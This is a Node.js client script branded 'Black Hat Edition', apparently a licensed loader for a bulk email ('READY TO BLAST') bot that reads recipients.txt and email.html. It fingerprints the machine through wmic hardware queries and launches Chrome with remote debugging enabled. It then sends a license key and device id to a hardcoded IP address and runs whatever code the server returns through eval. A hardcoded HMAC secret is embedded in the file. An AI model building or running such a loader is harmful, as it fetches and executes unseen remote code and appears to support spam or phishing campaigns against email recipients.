// client.js - BigBen Office - Black Hat Edition
const crypto = require('crypto');
const http = require('http');
const readline = require('readline');
const { execSync, exec } = require('child_process');
const os = require('os');
const fs = require('fs');

// Colors - Dark theme
const c = {
    red: '\x1b[31m',
    darkRed: '\x1b[38;5;88m',
    brightRed: '\x1b[91m',
    black: '\x1b[30m',
    darkGray: '\x1b[90m',
    silver: '\x1b[37m',
    gold: '\x1b[33m',
    reset: '\x1b[0m',
    bgBlack: '\x1b[40m'
};

const API_SERVER = "http://185.90.162.14:3001";
const SECRET_KEY = "MySecretKey2024_7f8s9d7f8s9d7f8s9d7f8s";

function banner() {
    console.log(c.brightRed + `
╔══════════════════════════════════════════════════════════════════╗
║              EMAIL AUTOMATION SYSTEM @BigBenOffice               ║
╚══════════════════════════════════════════════════════════════════╝
` + c.reset);
}

function getDeviceId() {
    try {
        let id = "";
        if (os.platform() === 'win32') {
            try {
                const diskOutput = execSync('wmic diskdrive get serialnumber', { encoding: 'utf8', stdio: ['pipe', 'pipe', 'ignore'] });
                const match = diskOutput.match(/[A-Z0-9_\-]{10,}/);
                if (match) id += match[0];
            } catch(e) {}
            try {
                const cpuOutput = execSync('wmic cpu get processorid', { encoding: 'utf8', stdio: ['pipe', 'pipe', 'ignore'] });
                const match = cpuOutput.match(/[A-Z0-9]{10,}/);
                if (match) id += match[0];
            } catch(e) {}
        }
        return crypto.createHash('sha256').update(id + os.hostname()).digest('hex');
    } catch(e) {
        return "UNKNOWN_" + Date.now();
    }
}

async function readLicenseFromFile() {
    const licenseFilePath = 'license.key';
    
    if (!fs.existsSync(licenseFilePath)) {
        console.log(c.brightRed + `\n  ✗ License file not found: ${licenseFilePath}` + c.reset);
        console.log(c.darkGray + `  Please create ${licenseFilePath} with your license key` + c.reset);
        process.exit(1);
    }
    
    try {
        const licenseKey = fs.readFileSync(licenseFilePath, 'utf8').trim();
        if (!licenseKey) {
            console.log(c.brightRed + `\n  ✗ License file is empty: ${licenseFilePath}` + c.reset);
            process.exit(1);
        }
        console.log(c.darkGray + `  → Loaded license from: ${licenseFilePath}` + c.reset);
        return licenseKey;
    } catch(e) {
        console.log(c.brightRed + `\n  ✗ Failed to read license file: ${e.message}` + c.reset);
        process.exit(1);
    }
}

async function ensureChromeRunning() {
    return new Promise((resolve) => {
        const req = http.request({ hostname: '127.0.0.1', port: 9222, path: '/json/version', method: 'GET', timeout: 3000 }, (res) => {
            console.log(c.darkGray + "  → Chrome remote debugging: ACTIVE" + c.reset);
            resolve(true);
        });
        
        req.on('error', () => {
            console.log(c.darkGray + "  → Launching Chrome with remote debugging..." + c.reset);
            const chromePath = '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"';
            const command = `${chromePath} --remote-debugging-port=9222`;
            exec(command, (error) => {});
            setTimeout(() => resolve(true), 5000);
        });
        req.end();
    });
}

async function verifyLicense(licenseKey) {
    const timestamp = Date.now();
    const signature = crypto.createHmac('sha256', SECRET_KEY)
        .update(licenseKey + timestamp)
        .digest('hex');
    
    const deviceId = getDeviceId();
    
    return new Promise((resolve) => {
        const req = http.request({
            hostname: '185.90.162.14',
            port: 3001,
            path: '/api/verify-license',
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch(e) {
                    resolve({ success: false, error: "Server error" });
                }
            });
        });
        req.on('error', (err) => {
            resolve({ success: false, error: "Cannot connect to license server" });
        });
        req.write(JSON.stringify({ licenseKey, timestamp, signature, deviceId }));
        req.end();
    });
}

async function main() {
    banner();
    
    // Show current directory and files
    console.log(c.darkGray + "\n  → Working directory: " + process.cwd() + c.reset);
    console.log(c.darkGray + "  → Files in directory:" + c.reset);
    try {
        const files = fs.readdirSync('.');
        files.forEach(f => console.log(c.darkGray + "      - " + f + c.reset));
    } catch(e) {}
    
    // Read license from file instead of prompting
    const licenseKey = await readLicenseFromFile();
    
    console.log(c.darkGray + "\n  → INITIALIZING..." + c.reset);
    await ensureChromeRunning();
    
    console.log(c.darkGray + "  → VALIDATING CREDENTIALS..." + c.reset);
    const result = await verifyLicense(licenseKey.trim());
    
    if (!result.success) {
        console.log(c.brightRed + "\n╔═════════════════════════════════════════════════════════════════╗" + c.reset);
        console.log(c.brightRed + "║  ACCESS DENIED                                              ║" + c.reset);
        console.log(c.brightRed + "╚═════════════════════════════════════════════════════════════════╝" + c.reset);
        console.error(c.brightRed + `\n  ✗ ${result.error}\n` + c.reset);
        process.exit(1);
    }
    
    console.log(c.brightRed + "\n╔═════════════════════════════════════════════════════════════════╗" + c.reset);
    console.log(c.brightRed + "║  ACCESS GRANTED                                             ║" + c.reset);
    console.log(c.brightRed + "╚═════════════════════════════════════════════════════════════════╝" + c.reset);
    console.log(c.darkGray + `\n  └─ TARGET: ${c.silver}${result.customer}` + c.reset);
    console.log(c.darkGray + `  └─ EXPIRE: ${c.silver}${result.expires}` + c.reset);
    
    console.log(c.brightRed + "\n╔═════════════════════════════════════════════════════════════════╗" + c.reset);
    console.log(c.brightRed + "║                    READY TO BLAST                              ║" + c.reset);
    console.log(c.brightRed + "╚═════════════════════════════════════════════════════════════════╝" + c.reset);
    
    // Check for required files
    console.log(c.darkGray + "\n  → CHECKING REQUIRED FILES:" + c.reset);
    const requiredFiles = ['config.json', 'recipients.txt', 'email.html'];
    let allFilesExist = true;
    for (const file of requiredFiles) {
        const exists = fs.existsSync(file);
        console.log(c.darkGray + `      ${exists ? '✅' : '❌'} ${file}` + c.reset);
        if (!exists) allFilesExist = false;
    }
    
    if (!allFilesExist) {
        console.log(c.brightRed + "\n  ✗ Missing required files! Please ensure all files are present.\n" + c.reset);
        process.exit(1);
    }
    
    console.log(c.darkGray + "\n  → EXECUTING BOT CODE...\n" + c.reset);
    
    // Execute the bot code with detailed error handling
    try {
        // Try to evaluate the code
        eval(result.code);
    } catch(err) {
        console.log(c.brightRed + "\n╔═════════════════════════════════════════════════════════════════╗" + c.reset);
        console.log(c.brightRed + "║  EXECUTION ERROR                                              ║" + c.reset);
        console.log(c.brightRed + "╚═════════════════════════════════════════════════════════════════╝" + c.reset);
        console.error(c.brightRed + `\n  ✗ Error: ${err.message}` + c.reset);
        console.error(c.darkGray + `\n  Stack: ${err.stack || 'No stack trace'}` + c.reset);
        
        // Check for specific errors
        if (err.message.includes('Cannot find module')) {
            const moduleName = err.message.match(/Cannot find module '(.+?)'/);
            if (moduleName) {
                console.log(c.brightRed + `\n  → Missing module: ${moduleName[1]}` + c.reset);
                console.log(c.darkGray + `    Install it with: npm install ${moduleName[1]}` + c.reset);
            }
        }
        
        if (err.message.includes('sharp')) {
            console.log(c.darkGray + `\n  → Install sharp: npm install sharp` + c.reset);
        }
        
        if (err.message.includes('docx')) {
            console.log(c.darkGray + `\n  → Install docx: npm install docx` + c.reset);
        }
        
        if (err.message.includes('puppeteer')) {
            console.log(c.darkGray + `\n  → Install puppeteer: npm install puppeteer` + c.reset);
        }
        
        console.log(c.brightRed + "\n  Please fix the above error and try again.\n" + c.reset);
        process.exit(1);
    }
}

main().catch((err) => {
    console.error(c.brightRed + `\n  ✗ Fatal error: ${err.message}` + c.reset);
    console.error(c.darkGray + `  Stack: ${err.stack}` + c.reset);
    process.exit(1);
});